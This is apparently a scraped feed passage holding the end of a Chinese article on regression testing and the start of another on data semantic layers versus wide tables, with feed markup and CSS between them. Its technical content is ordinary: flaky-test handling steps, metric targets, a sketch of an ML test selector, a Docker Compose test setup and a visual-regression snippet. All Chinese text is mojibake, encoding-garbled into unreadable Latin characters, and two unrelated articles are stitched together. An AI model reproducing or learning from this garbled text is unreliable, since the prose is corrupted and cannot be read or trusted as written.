<pre><code class="hljs language-markdown" lang="markdown">ä¸ç¨³å®šæµ‹è¯•å¤„ç†æµç¨‹ï¼š
<span class="hljs-bullet">1.</span> éš”ç¦»ï¼šç§»å‡ºä¸»å›å½’å¥—ä»¶ï¼Œæ”¾å…¥ä¸“é¡¹å¥—ä»¶
<span class="hljs-bullet">2.</span> è¯Šæ–­ï¼šåˆ†ææ ¹æœ¬åŸå› ï¼ˆæ—¶åºã€ç«æ€ã€ç¯å¢ƒç­‰ï¼‰
<span class="hljs-bullet">3.</span> ä¿®å¤ï¼šæŠ•å…¥ä¸“é—¨èµ„æºä¿®å¤æˆ–é‡å†™
<span class="hljs-bullet">4.</span> éªŒè¯ï¼šç¨³å®šè¿è¡Œ30æ¬¡åé‡æ–°çº³å…¥ä¸»å¥—ä»¶
<span class="hljs-bullet">5.</span> æ·˜æ±°ï¼š30å¤©å†…æ— æ³•ä¿®å¤çš„æµ‹è¯•è€ƒè™‘æ·˜æ±°
</code></pre>
</li>
</ol>
<h3 data-id="heading-14">3.4 ç¬¬å››é˜¶æ®µï¼šåº¦é‡ä¸æŒç»­æ”¹è¿›</h3>
<h4 data-id="heading-15">3.4.1 å…³é”®åº¦é‡æŒ‡æ ‡</h4>





















































<table><thead><tr><th>æŒ‡æ ‡ç±»åˆ«</th><th>å…·ä½“æŒ‡æ ‡</th><th>ç›®æ ‡å€¼</th><th>æµ‹é‡é¢‘ç‡</th></tr></thead><tbody><tr><td>æ•ˆç‡æŒ‡æ ‡</td><td>æµ‹è¯•æ‰§è¡Œæ—¶é—´</td><td>&lt;1å°æ—¶ï¼ˆCI/CDæµæ°´çº¿ï¼‰</td><td>æ¯æ¬¡æ„å»º</td></tr><tr><td/><td>è‡ªåŠ¨åŒ–ç‡</td><td>&gt;70%ï¼ˆå•å…ƒ/é›†æˆï¼‰</td><td>æ¯æœˆ</td></tr><tr><td>è´¨é‡æŒ‡æ ‡</td><td>ç¼ºé™·é€ƒé€¸ç‡</td><td>&lt;5%</td><td>æ¯æ¬¡å‘å¸ƒ</td></tr><tr><td/><td>å›å½’æµ‹è¯•æ•è·ç¼ºé™·æ¯”ä¾‹</td><td>&gt;30%</td><td>æ¯æ¬¡å‘å¸ƒ</td></tr><tr><td>ç¨³å®šæ€§æŒ‡æ ‡</td><td>æµ‹è¯•é€šè¿‡ç‡</td><td>&gt;95%</td><td>æ¯æ¬¡æ„å»º</td></tr><tr><td/><td>ä¸ç¨³å®šæµ‹è¯•æ¯”ä¾‹</td><td>&lt;2%</td><td>æ¯å‘¨</td></tr><tr><td>æˆæœ¬æŒ‡æ ‡</td><td>æµ‹è¯•ç»´æŠ¤æˆæœ¬/æ€»å¼€å‘æˆæœ¬</td><td>&lt;15%</td><td>æ¯å­£åº¦</td></tr></tbody></table>
<h4 data-id="heading-16">3.4.2 æ ¹æœ¬åŸå› åˆ†æï¼ˆRCAï¼‰æµç¨‹</h4>
<p>å¯¹äºæ¯ä¸ªé€ƒé€¸åˆ°ç”Ÿäº§ç¯å¢ƒçš„ç¼ºé™·ï¼Œæ‰§è¡Œ5Whyåˆ†æï¼š</p>
<ol>
<li>ä¸ºä»€ä¹ˆå›å½’æµ‹è¯•æ²¡å‘ç°è¿™ä¸ªç¼ºé™·ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆç›¸å…³æµ‹è¯•ç”¨ä¾‹ä¸å­˜åœ¨/ä¸å®Œå–„ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆæµ‹è¯•ç”¨ä¾‹è®¾è®¡æ—¶é—æ¼äº†è¿™ä¸ªåœºæ™¯ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆéœ€æ±‚/è®¾è®¡è¯„å®¡æ—¶æ²¡è¯†åˆ«å‡ºè¿™ä¸ªé£é™©ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆæˆ‘ä»¬çš„æµç¨‹/æ–‡åŒ–å¯¼è‡´äº†è¿™ä¸ªç›²ç‚¹ï¼Ÿ</li>
</ol>
<h2 data-id="heading-17">4. ç°ä»£å›å½’æµ‹è¯•çš„å…ˆè¿›å®è·µ</h2>
<h3 data-id="heading-18">4.1 åŸºäºæœºå™¨å­¦ä¹ çš„æ™ºèƒ½æµ‹è¯•é€‰æ‹©</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ™ºèƒ½æµ‹è¯•é€‰æ‹©ç³»ç»Ÿæ¦‚å¿µ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">IntelligentTestSelector</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, historical_data</span>):
        self.model = self.train_model(historical_data)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train_model</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-string">"""è®­ç»ƒé¢„æµ‹æ¨¡å‹ï¼šä»£ç å˜æ›´ -&gt; å¯èƒ½å½±å“çš„æµ‹è¯•"""</span>
        features = [
            <span class="hljs-string">'changed_modules'</span>,
            <span class="hljs-string">'developer_experience'</span>,
            <span class="hljs-string">'time_since_last_change'</span>,
            <span class="hljs-string">'historical_failure_rate'</span>
        ]
        <span class="hljs-comment"># ä½¿ç”¨éšæœºæ£®æ—æˆ–ç¥ç»ç½‘ç»œé¢„æµ‹</span>
        <span class="hljs-keyword">return</span> trained_model
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_tests</span>(<span class="hljs-params">self, current_change</span>):
        predictions = self.model.predict(current_change)
        <span class="hljs-keyword">return</span> self.optimize_selection(predictions)
</code></pre>
<h3 data-id="heading-19">4.2 å®¹å™¨åŒ–ä¸æµ‹è¯•ç¯å¢ƒç®¡ç†</h3>
<ol>
<li>
<p><strong>æŒ‰éœ€æµ‹è¯•ç¯å¢ƒ</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Docker Composeå®šä¹‰å®Œæ•´æµ‹è¯•ç¯å¢ƒ</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">app-under-test:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">myapp:${BUILD_NUMBER}</span>
    
  <span class="hljs-attr">test-database:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:13</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=test_db</span>
    
  <span class="hljs-attr">mock-services:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wiremock:2.32</span>
    
  <span class="hljs-attr">test-runner:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">test-executor:latest</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-under-test</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">test-database</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">pytest</span> <span class="hljs-string">/tests/regression</span>
</code></pre>
</li>
<li>
<p><strong>æµ‹è¯•æ•°æ®ç®¡ç†</strong>ï¼š</p>
<ul>
<li>é»„é‡‘æ•°æ®é›†ï¼šæ ¸å¿ƒä¸šåŠ¡æµç¨‹çš„æ ‡å‡†åŒ–æ•°æ®</li>
<li>åˆæˆæ•°æ®ç”Ÿæˆï¼šæ•æ„Ÿæ•°æ®çš„æ›¿ä»£æ–¹æ¡ˆ</li>
<li>æ•°æ®åº“å¿«ç…§ï¼šå¿«é€Ÿé‡ç½®æµ‹è¯•çŠ¶æ€</li>
</ul>
</li>
</ol>
<h3 data-id="heading-20">4.3 å¯è§†åŒ–å›å½’æµ‹è¯•</h3>
<p>å¯¹äºUIå¯†é›†å‹åº”ç”¨ï¼Œå®æ–½åƒç´ çº§æ¯”è¾ƒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯è§†åŒ–å›å½’æµ‹è¯•æµç¨‹</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">visualRegressionTest</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 1. åŸºçº¿æˆªå›¾</span>
  <span class="hljs-keyword">const</span> baseline = <span class="hljs-keyword">await</span> <span class="hljs-title function_">screenshot</span>(<span class="hljs-string">'homepage'</span>);
  
  <span class="hljs-comment">// 2. æ–°ç‰ˆæœ¬æˆªå›¾</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">deployNewVersion</span>();
  <span class="hljs-keyword">const</span> current = <span class="hljs-keyword">await</span> <span class="hljs-title function_">screenshot</span>(<span class="hljs-string">'homepage'</span>);
  
  <span class="hljs-comment">// 3. æ¯”è¾ƒä¸æŠ¥å‘Š</span>
  <span class="hljs-keyword">const</span> diff = <span class="hljs-keyword">await</span> <span class="hljs-title function_">compareImages</span>(baseline, current);
  
  <span class="hljs-keyword">if</span> (diff.<span class="hljs-property">percentage</span> &gt; <span class="hljs-number">0.1</span>) { <span class="hljs-comment">// å…è®¸çš„å·®å¼‚é˜ˆå€¼</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateReport</span>({
      <span class="hljs-attr">diffImage</span>: diff.<span class="hljs-property">image</span>,
      <span class="hljs-attr">changedAreas</span>: diff.<span class="hljs-property">areas</span>,
      <span class="hljs-attr">approvalRequired</span>: <span class="hljs-literal">true</span>
    });
  }
}
</code></pre>
<h2 data-id="heading-21">5. ç»„ç»‡ä¸æ–‡åŒ–ç»´åº¦</h2>
<h3 data-id="heading-22">5.1 å›å½’æµ‹è¯•çš„æ‰€æœ‰æƒæ¨¡å‹</h3>
<ol>
<li><strong>å¼€å‘äººå‘˜è´Ÿè´£åˆ¶</strong>ï¼šç¼–å†™å’Œç»´æŠ¤å•å…ƒ/é›†æˆæµ‹è¯•</li>
<li><strong>æµ‹è¯•å·¥ç¨‹å¸ˆè´Ÿè´£åˆ¶</strong>ï¼šç³»ç»Ÿæµ‹è¯•ã€E2Eæµ‹è¯•å’Œæµ‹è¯•æ¡†æ¶</li>
<li><strong>å…±äº«æ‰€æœ‰æƒ</strong>ï¼šç»“å¯¹ç¼–å†™æµ‹è¯•ï¼Œé›†ä½“ç»´æŠ¤æµ‹è¯•å¥—ä»¶</li>
</ol>
<h3 data-id="heading-23">5.2 æŒç»­æ”¹è¿›çš„æ–‡åŒ–å»ºè®¾</h3>
<ol>
<li><strong>æµ‹è¯•å“è¶Šå‘¨</strong>ï¼šæ¯å­£åº¦ä¸“æ³¨æ”¹è¿›æµ‹è¯•åŸºç¡€è®¾æ–½</li>
<li><strong>æµ‹è¯•ä»£ç è¯„å®¡</strong>ï¼šä¸äº§å“ä»£ç åŒç­‰ä¸¥æ ¼çš„è¯„å®¡æ ‡å‡†</li>
<li><strong>è´¨é‡åº¦é‡é€æ˜åŒ–</strong>ï¼šå…¬å¼€å±•ç¤ºå›å½’æµ‹è¯•å¥åº·åº¦</li>
</ol>
<h2 data-id="heading-24">6. æ¡ˆä¾‹ç ”ç©¶ï¼šä¸­å‹ç”µå•†å¹³å°çš„å›å½’æµ‹è¯•æ¼”è¿›</h2>
<h3 data-id="heading-25">èƒŒæ™¯</h3>
<ul>
<li>å›¢é˜Ÿè§„æ¨¡ï¼š15ä¸ªå¼€å‘ï¼Œ5ä¸ªæµ‹è¯•</li>
<li>å‘å¸ƒé¢‘ç‡ï¼šä»æ¯æœˆå‘å¸ƒåˆ°æ¯å‘¨å‘å¸ƒ</li>
<li>æŒ‘æˆ˜ï¼šå›å½’æµ‹è¯•æ—¶é—´ä»2å°æ—¶å¢åŠ åˆ°8å°æ—¶</li>
</ul>
<h3 data-id="heading-26">å®æ–½æ­¥éª¤</h3>
<ol>
<li><strong>ç¬¬1ä¸ªæœˆ</strong>ï¼šå»ºç«‹è‡ªåŠ¨åŒ–åŸºç¡€ï¼Œå…³é”®è·¯å¾„E2Eæµ‹è¯•è‡ªåŠ¨åŒ–ç‡ä»30%æå‡åˆ°60%</li>
<li><strong>ç¬¬2ä¸ªæœˆ</strong>ï¼šå¼•å…¥åŸºäºé£é™©çš„æµ‹è¯•é€‰æ‹©ï¼Œæ‰§è¡Œæ—¶é—´å‡å°‘40%</li>
<li><strong>ç¬¬3ä¸ªæœˆ</strong>ï¼šå®æ–½åˆ†å±‚æµ‹è¯•ç­–ç•¥ï¼Œå•å…ƒæµ‹è¯•è¦†ç›–ç‡ä»45%æå‡åˆ°75%</li>
<li><strong>ç¬¬4ä¸ªæœˆ</strong>ï¼šä¼˜åŒ–ä¸ç¨³å®šæµ‹è¯•ï¼Œé€šè¿‡ç‡ä»88%æå‡åˆ°96%</li>
</ol>
<h3 data-id="heading-27">æˆæœ</h3>
<ul>
<li>å›å½’æµ‹è¯•æ‰§è¡Œæ—¶é—´ï¼š8å°æ—¶ â†’ 45åˆ†é’Ÿ</li>
<li>ç¼ºé™·é€ƒé€¸ç‡ï¼š8% â†’ 2.5%</li>
<li>å‘å¸ƒä¿¡å¿ƒæŒ‡æ•°ï¼šä¸­ç­‰ â†’ é«˜</li>
</ul>
<h2 data-id="heading-28">7. ç»“è®ºä¸æœªæ¥è¶‹åŠ¿</h2>
<p>å›å½’æµ‹è¯•å·²ä»è´¨é‡ä¿éšœçš„é™„åŠ æ´»åŠ¨æ¼”å˜ä¸º<strong>è½¯ä»¶äº¤ä»˜ç®¡é“çš„æ ¸å¿ƒç»„ä»¶</strong>ã€‚æœªæ¥çš„å‘å±•è¶‹åŠ¿åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>AIé©±åŠ¨çš„æ™ºèƒ½æµ‹è¯•</strong>ï¼šåŸºäºä»£ç è¯­ä¹‰å’Œç†è§£ä¸šåŠ¡é€»è¾‘çš„æµ‹è¯•ç”Ÿæˆ</li>
<li><strong>æ··æ²Œå·¥ç¨‹é›†æˆ</strong>ï¼šåœ¨å›å½’æµ‹è¯•ä¸­ä¸»åŠ¨æ³¨å…¥æ•…éšœï¼ŒéªŒè¯ç³»ç»ŸéŸ§æ€§</li>
<li><strong>ç”Ÿäº§ç¯å¢ƒå›å½’</strong>ï¼šåœ¨å—æ§æ¡ä»¶ä¸‹å¯¹ç”Ÿäº§æµé‡è¿›è¡ŒA/Bæµ‹è¯•</li>
<li><strong>å®Œå…¨è‡ªåŠ¨åŒ–ä¿®å¤</strong>ï¼šAIä¸ä»…å‘ç°é—®é¢˜ï¼Œè¿˜èƒ½ç”Ÿæˆä¿®å¤ä»£ç </li>
</ol>
<p>æˆåŠŸå®æ–½å›å½’æµ‹è¯•çš„å…³é”®åœ¨äº<strong>å¹³è¡¡</strong>â€”â€”åœ¨æµ‹è¯•è¦†ç›–åº¦ã€æ‰§è¡Œæ—¶é—´ã€ç»´æŠ¤æˆæœ¬å’Œå‘ç°ç¼ºé™·èƒ½åŠ›ä¹‹é—´æ‰¾åˆ°ç»„ç»‡çš„æœ€ä¼˜å¹³è¡¡ç‚¹ã€‚è¿™éœ€è¦æŠ€æœ¯ã€æµç¨‹å’Œæ–‡åŒ–çš„ç»¼åˆæ¼”è¿›ï¼Œè€Œéå•çº¯å·¥å…·æˆ–æ–¹æ³•çš„å¼•å…¥ã€‚</p>
<p>å›å½’æµ‹è¯•çš„ç»ˆæç›®æ ‡ä¸æ˜¯æ¶ˆé™¤æ‰€æœ‰ç¼ºé™·ï¼Œè€Œæ˜¯å»ºç«‹ä¸€ç§<strong>å¯é¢„æµ‹çš„è´¨é‡ä¿¡å¿ƒ</strong>ï¼Œä½¿ç»„ç»‡èƒ½å¤Ÿä»¥å¯æŒç»­çš„é€Ÿåº¦äº¤ä»˜é«˜è´¨é‡è½¯ä»¶ï¼Œå¿«é€Ÿå“åº”å¸‚åœºå˜åŒ–è€Œä¸ç‰ºç‰²ç¨³å®šæ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ•°æ®è¯­ä¹‰å±‚ vs å®½è¡¨æ¨¡å¼ï¼šå“ªç§æ¶æ„æ›´é€‚åˆ AI æ—¶ä»£çš„æ•°æ®åˆ†æï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597452210646679552</link>    <guid>https://juejin.cn/post/7597452210646679552</guid>    <pubDate>2026-01-21T11:23:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597452210646679552" data-draft-id="7597635202324693044" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ•°æ®è¯­ä¹‰å±‚ vs å®½è¡¨æ¨¡å¼ï¼šå“ªç§æ¶æ„æ›´é€‚åˆ AI æ—¶ä»£çš„æ•°æ®åˆ†æï¼Ÿ"/> <meta itemprop="keywords" content="æ•°æ®åˆ†æ"/> <meta itemprop="datePublished" content="2026-01-21T11:23:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Aloudataå¤§åº”ç§‘æŠ€"/> <meta itemprop="url" content="https://juejin.cn/user/1579340474099927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ•°æ®è¯­ä¹‰å±‚ vs å®½è¡¨æ¨¡å¼ï¼šå“ªç§æ¶æ„æ›´é€‚åˆ AI æ—¶ä»£çš„æ•°æ®åˆ†æï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1579340474099927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Aloudataå¤§åº”ç§‘æŠ€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:23:26.000Z" title="Wed Jan 21 2026 11:23:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ AI é©±åŠ¨çš„æ•°æ®åˆ†ææ—¶ä»£ï¼Œä¼ ç»Ÿå®½è¡¨æ¨¡å¼å› æ•æ·æ€§ä¸è¶³ã€æ•°æ®å†—ä½™å’Œéš¾ä»¥æ”¯æŒå³å¸­æŸ¥è¯¢è€ŒåŠ›ä¸ä»å¿ƒã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒNoETL æ•°æ®è¯­ä¹‰å±‚ï¼ˆSemantic Layerï¼‰ä½œä¸ºä½äºæ•°æ®å­˜å‚¨ä¸åº”ç”¨é—´çš„æŠ½è±¡å±‚ï¼Œé€šè¿‡å°†ç‰©ç†æ•°æ®æ˜ å°„ä¸ºç»Ÿä¸€ä¸šåŠ¡è¯­ä¹‰ï¼Œå®ç°äº†é€»è¾‘ä¸ç‰©ç†è§£è€¦ã€‚å¯¹äºéœ€è¦å¿«é€Ÿå“åº”å˜åŒ–ã€æ”¯æŒ AI äº¤äº’çš„åœºæ™¯ï¼Œè¯­ä¹‰å±‚æ¶æ„æ˜¯æ›´å…·é€‚åº”æ€§çš„é€‰æ‹©ï¼Œèƒ½æä¾›é›¶ç­‰å¾…çš„æŒ‡æ ‡äº¤ä»˜å’Œ 100% ä¸€è‡´çš„ä¸šåŠ¡å£å¾„ã€‚</p>
<h2 data-id="heading-0">AI æ—¶ä»£ä¸‹ï¼Œä¼ ç»Ÿå®½è¡¨æ¨¡å¼ä¸ºä½•åŠ›ä¸ä»å¿ƒï¼Ÿ</h2>
<p>æ•°æ®åˆ†ææ­£ä»â€œé¢„åˆ¶å“åŠ å·¥â€è½¬å‘â€œè‡ªåŠ©å¼å¨æˆ¿â€ã€‚è¿‡å»æ”¯æ’‘æŠ¥è¡¨çš„å®½è¡¨æ¨¡å¼ï¼Œåœ¨ AI é©±åŠ¨ã€å³å¸­æŸ¥è¯¢çš„éœ€æ±‚ä¸‹æš´éœ²ä¸‰å¤§ç“¶é¢ˆï¼š</p>
<ol>
<li>æ•æ·æ€§åå¡Œï¼šä¸šåŠ¡å˜æ›´éœ€å›æº¯ä¿®æ”¹ ETLã€é‡è·‘å®½è¡¨ï¼Œå“åº”å‘¨æœŸé•¿è¾¾æ•°å‘¨ã€‚</li>
<li>æ•°æ®ä¸€è‡´æ€§å¤±æ§ï¼šå¤šå¼ å£å¾„å„å¼‚çš„å®½è¡¨å¯¼è‡´â€œæŒ‡æ ‡æ‰“æ¶â€ï¼ŒAI æ¨¡å‹åŸºäºæ­¤å°†äº§ç”Ÿä¸å¯é æ´å¯Ÿã€‚</li>
<li>æ— æ³•æ”¯æŒå³å¸­æŸ¥è¯¢ï¼šå®½è¡¨åªèƒ½å›ç­”é¢„è®¾é—®é¢˜ï¼Œæ— æ³•å“åº”è·¨åŸŸã€ä¸´æ—¶çš„åˆ†æéœ€æ±‚ã€‚</li>
</ol>
<p>ä¾‹å¦‚ï¼Œå‘¨äº”ä¸‹åˆï¼Œå¸‚åœºéƒ¨éœ€è¦æ–°æŒ‡æ ‡è¯„ä¼°ä¿ƒé”€æ´»åŠ¨ã€‚æ•°æ®å›¢é˜Ÿå‘ŠçŸ¥éœ€æ–°å»ºå®½è¡¨ï¼Œæ’æœŸè‡³ä¸‹å‘¨ä¸‰ã€‚å†³ç­–æ—¶æœºå·²ç„¶é”™è¿‡ã€‚è¿™ç§â€œå“åº”è¿Ÿæ»â€åœ¨ AI æ—¶ä»£æ˜¯è‡´å‘½çš„ã€‚</p>
<h2 data-id="heading-1">ä»€ä¹ˆæ˜¯ NoETL æ•°æ®è¯­ä¹‰å±‚ï¼ˆSemantic Layerï¼‰ï¼Ÿ</h2>
<p>NoETL æ•°æ®è¯­ä¹‰å±‚ï¼ˆSemantic Layerï¼‰æ˜¯æ•°æ®å­˜å‚¨ä¸æ•°æ®åº”ç”¨é—´çš„å…³é”®æŠ½è±¡å±‚ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯å°†å¤æ‚çš„æŠ€æœ¯æ•°æ®ç»“æ„æ˜ å°„ä¸ºç»Ÿä¸€çš„ä¸šåŠ¡æœ¯è¯­å’ŒæŒ‡æ ‡ï¼Œå……å½“æ•°æ®çš„â€œä¸šåŠ¡ç¿»è¯‘å®˜â€ã€‚å…¶é¢ è¦†æ€§æºäºä¸‰å¤§æŠ€æœ¯ç†å¿µï¼š</p>
<ol>
<li>è§£è€¦é€»è¾‘ä¸ç‰©ç†ï¼šä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚â€œé”€å”®é¢=ä»·æ ¼Ã—æ•°é‡-æŠ˜æ‰£â€ï¼‰ä¸å†ç¡¬ç¼–ç äº ETLï¼Œè€Œæ˜¯ä½œä¸ºå¯å¤ç”¨å®šä¹‰å­˜å‚¨äºè¯­ä¹‰å±‚ã€‚</li>
<li>ç»Ÿä¸€ä¸šåŠ¡è¯­ä¹‰ï¼šåŠ¨æ€ç¼–ç»‡æ˜ç»†æ•°æ®ä¸ºç»Ÿä¸€çš„ä¸šåŠ¡è¯­ä¹‰ï¼Œç¡®ä¿å…¨å…¬å¸å¯¹â€œé”€å”®é¢â€åªæœ‰ä¸€ä¸ªå®šä¹‰ï¼Œå®ç°â€œå•ä¸€äº‹å®æ¥æºâ€ã€‚</li>
<li>å®æ—¶æŸ¥è¯¢ä¸‹æ¨ï¼šå°†â€œæŸ¥çœ‹åä¸œåŒºé”€å”®é¢â€çš„æŸ¥è¯¢å®æ—¶ç¿»è¯‘ã€ä¼˜åŒ–å¹¶ä¸‹æ¨è‡³æ•°æ®æºæ‰§è¡Œï¼Œæ— éœ€ç§»åŠ¨å’Œé¢„è®¡ç®—æ•°æ®ã€‚</li>
</ol>
<h3 data-id="heading-2">ä¸ºä»€ä¹ˆå®ƒæ˜¯ AI æ—¶ä»£çš„å…³é”®ï¼Ÿ</h3>
